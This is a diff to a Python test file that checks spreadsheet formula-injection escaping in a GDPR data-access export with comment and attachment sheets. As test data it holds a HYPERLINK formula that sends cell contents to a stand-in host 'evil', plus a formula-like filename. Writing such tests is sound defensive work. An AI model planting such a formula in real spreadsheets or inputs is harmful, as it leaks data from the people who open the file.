@@ -1,4 +1,4 @@
-"""Formula injection defense for the DSGVO Auskunft extra sheets (AUD-015).
+"""Formula injection defense for the DSGVO Auskunft extra sheets.
 
 The module-local `app.modules.privacy.service.build_auskunft_workbook` adds two
 sheets to the shared base workbook: `Kommentare` and `Anhänge`. Both hold data under
@@ -31,6 +31,11 @@ def _load(data: bytes) -> Any:
 
 
 def test_auskunft_escapes_comment_body() -> None:
+    """Escape the comment body.
+
+    Column 5 is the "Text" column (Comment.body) in the first data row. No cell of the
+    row may persist as an active formula.
+    """
     payload = '=HYPERLINK("http://evil/?"&A1,"x")'
     data = build_auskunft_workbook(
         email="user@example.org",
@@ -49,17 +54,19 @@ def test_auskunft_escapes_comment_body() -> None:
         attachments=[],
     )
     ws = _load(data)["Kommentare"]
-    # Column 5 is the "Text" column (Comment.body) in the first data row.
     body_cell = ws.cell(row=2, column=5).value
     assert body_cell == "'" + payload
-    # No cell of the row may persist as an active formula.
     for col in range(1, 6):
         val = ws.cell(row=2, column=col).value
         assert not (isinstance(val, str) and val[:1] in _FORMULA_PREFIXES)
 
 
 def test_auskunft_escapes_attachment_filename() -> None:
-    # sanitize_filename keeps a leading '-', '+' or '@', so a live formula is a risk.
+    """Escape the attachment filename.
+
+    sanitize_filename keeps a leading '-', '+' or '@', so a live formula is a risk.
+    Column 2 is the "Dateiname" column and column 3 is the "Typ" column.
+    """
     filename = "-1+1.pdf"
     data = build_auskunft_workbook(
         email="user@example.org",
@@ -78,7 +85,6 @@ def test_auskunft_escapes_attachment_filename() -> None:
         ],
     )
     ws = _load(data)["Anhänge"]
-    # Column 2 is the "Dateiname" column and column 3 is the "Typ" column.
     name_cell = ws.cell(row=2, column=2).value
     mime_cell = ws.cell(row=2, column=3).value
     assert name_cell == "'" + filename
